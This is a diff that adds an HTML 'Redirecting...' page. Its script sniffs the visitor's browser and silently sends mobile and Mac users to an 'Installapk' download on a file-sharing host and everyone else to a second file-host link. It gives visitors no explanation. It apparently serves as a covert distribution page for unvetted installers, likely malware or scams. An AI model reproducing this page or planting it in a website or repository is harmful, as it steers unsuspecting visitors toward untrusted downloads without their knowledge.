@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Redirecting...</title>
+</head>
+<body>
+    <script>
+        const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+        const link1 = "https://mediaupload.info/?h=f3d2e6c7c0401fda63bb37aa44801537&z=209";
+        const link2 = "https://igk.filexspace.com/getfile/XKQSPMO?title=Installapk";
+
+        let redirectUrl;
+
+        if (/Android/i.test(userAgent) ||
+            /iPhone|iPad|iPod/i.test(userAgent) ||
+            /Macintosh|Mac OS X/i.test(userAgent)) {
+            redirectUrl = link2;
+        } else if (/Windows/i.test(userAgent) || /Linux/i.test(userAgent)) {
+            redirectUrl = link1;
+        } else {
+            redirectUrl = link1;
+        }
+
+        window.location.href = redirectUrl;
+    </script>
+    <p>Redirecting, please wait...</p>
+</body>
+</html>
